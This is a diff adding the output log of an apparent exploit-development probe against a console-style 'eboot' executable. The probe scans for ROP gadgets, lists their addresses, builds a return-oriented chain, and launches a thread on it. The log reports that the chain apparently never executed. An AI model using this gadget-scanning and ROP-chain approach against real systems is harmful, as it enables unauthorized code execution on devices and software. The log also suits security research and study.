@@ -1,0 +1,71 @@
+=== PROBE 80b: THREAD ROP CHAIN ===
+
+[*] canary pid=245
+[*] eboot base=0x00000000_61CA4000
+
+[1] Scanning eboot for ROP gadgets...
+  pop_rdi_ret = NOT FOUND
+  pop_rsi_ret = eboot+0xD77D = 0x00000000_61CB177D
+  pop_rdx_ret = NOT FOUND
+  pop_rax_ret = eboot+0x992 = 0x00000000_61CA4992
+  pop_rcx_ret = eboot+0xE64 = 0x00000000_61CA4E64
+  pop_rbp_ret = eboot+0x79 = 0x00000000_61CA4079
+  ret = eboot+0x42 = 0x00000000_61CA4042
+  syscall_ret = NOT FOUND
+  mov_rsi_rax_ret = NOT FOUND
+  mov_rsi_eax_ret = NOT FOUND
+  mov_rdi_eax_ret = NOT FOUND
+  mov_rdi_rax_ret = NOT FOUND
+  mov_rcx_eax_ret = NOT FOUND
+  mov_rcx_rax_ret = NOT FOUND
+  xor_eax_ret = eboot+0x471 = 0x00000000_61CA4471
+  Extending scan for pop_rdi_ret to 1MB...
+  pop_rdi_ret = eboot+0xC9DFE = 0x00000000_61D6DDFE
+
+[!] No direct write gadget found. Using stack-modification proof instead.
+[2] Building ROP chain...
+  marker addr=0x00000003_106745C0 initial=0x0
+  stack mmap: ok=true base=0x00000003_10A48000
+  Strategy: stack-canary proof (no write gadget)
+  chain: 10 slots, canary at +40
+  chain dump:
+    +00: 0x00000000_61CA4042
+    +08: 0x00000000_61CA4042
+    +10: 0x00000000_61CA4042
+    +18: 0x00000000_61CA4042
+    +20: 0x00000000_61CA4042
+    +28: 0x00000000_61CA4042
+    +30: 0x00000000_61CA4042
+    +38: 0x00000000_61CA4042
+    +40: 0x00000000_CAFEBABE
+    +48: 0x00000000_00000000
+
+[3] Creating thread with ROP chain...
+  RIP=0x00000000_61CA4042
+  RSP=0x00000003_10A84800
+  thr_create: ok=true rv=0xffffffffffffffffffffffff
+  tid=0x00000000_00018EEE
+
+[4] Waiting for thread execution...
+  marker value after wait: 0x00000000
+  marker not written (0x00000000)
+  possible causes: timing, gadget issue, or chain didn't execute
+
+  stack state check:
+    chain+00: 0x00000000_61CA4042
+    chain+08: 0x00000000_61CA4042
+    chain+10: 0x00000000_61CA4042
+    chain+18: 0x00000000_61CA4042
+    chain+20: 0x00000000_61CA4042
+    chain+28: 0x00000000_61CA4042
+    chain+30: 0x00000000_61CA4042
+    chain+38: 0x00000000_61CA4042
+    chain+40: 0x00000000_CAFEBABE
+    chain+48: 0x00000000_00000000
+    chain+50: 0x00000000_00000000
+    chain+58: 0x00000000_00000000
+    chain+60: 0x00000000_00000000
+  marker recheck: 0x00000000
+
+[5] canary: ok=true pid=245
+=== PROBE 80b COMPLETE ===
